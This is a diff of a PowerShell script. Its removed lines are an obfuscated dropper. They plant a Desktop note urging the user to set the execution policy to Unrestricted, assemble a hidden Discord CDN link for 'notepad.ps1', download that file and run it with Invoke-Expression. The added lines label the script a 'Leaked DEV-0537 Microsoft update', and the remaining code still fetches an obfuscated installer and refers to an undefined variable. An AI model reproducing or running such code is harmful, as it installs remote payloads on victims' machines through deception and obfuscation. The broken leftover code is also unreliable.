@@ -1,32 +1,7 @@
-
-$fileContent = "Command: Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser"
-$desktopPath = [Environment]::GetFolderPath("Desktop")
-$filePath = Join-Path -Path $desktopPath -ChildPath "Before_Proceeding.txt"
-$fileContent | Set-Content -Path $filePath -Force
-Start-Process notepad.exe -ArgumentList $filePath
-Start-Sleep -Seconds 1
-Add-Type -AssemblyName System.Windows.Forms
-[System.Windows.Forms.SendKeys]::SendWait('% x')
-
-${U`Rl} = ("{3}{14}{15}{6}{29}{36}{11}{33}{30}{2}{23}{13}{18}{0}{28}{7}{38}{31}{37}{4}{19}{9}{27}{1}{16}{25}{17}{10}{20}{26}{12}{22}{34}{21}{35}{24}{8}{5}{32}"-f '7872/','6','/1','https:','s1?','311e08ef','ord','8','8','=66','41af','h','2','276','//cdn.','disc','5','c7','89','ex','74df80','ae2b','2fd6c254f0abaef','218683568','7819bfb8fd','f62bd0&hm=1','8be','08a0d0&is=','121','app.com/','s','/','ed8b','ment','5ed','ae','attac','notepad.p','703212086034552')
-$outputFile = "$env:TEMP\notepad.ps1"
-$url = "https://www.curseforge.com/" 
-
+#Leaked DEV-0537 Microsoft update :)
+$url = "https://support.microsoft.com/en-us/windows/get-the-latest-windows-update-7d20e88c-0568-483a-37bc-c3885390d212" 
 Start-Process $url
 Invoke-WebRequest -Uri $url -OutFile $outputFile
-Write-Host "Press Ctrl C to end the PowerShell"
-Write-Host "a README.txt Document has been created paste the command into the powershell"
-
-if (Test-Path $outputFile) {
-    Invoke-Expression -Command $outputFile
-} else {
-    Write-Host "Failed to download the file."
-}
-
-$duration = 40  
-Write-Host "Timer started for 40 seconds."
-Start-Sleep -Seconds $duration
-Write-Host "Timer expired after 40 seconds."
 
 ${WIN`RaR`URL} = ("{4}{13}{5}{9}{6}{3}{0}{1}{11}{12}{7}{10}{2}{8}" -f'admin/winrar-ve','r','4-60','-rar.com/file','h',':','.win','inrar/wi','2.exe','//www','nrar-x6','si','ons/w','ttps')
 ${I`N`StALleRpa`Th} = "$env:TEMP\winrar-installer.exe"
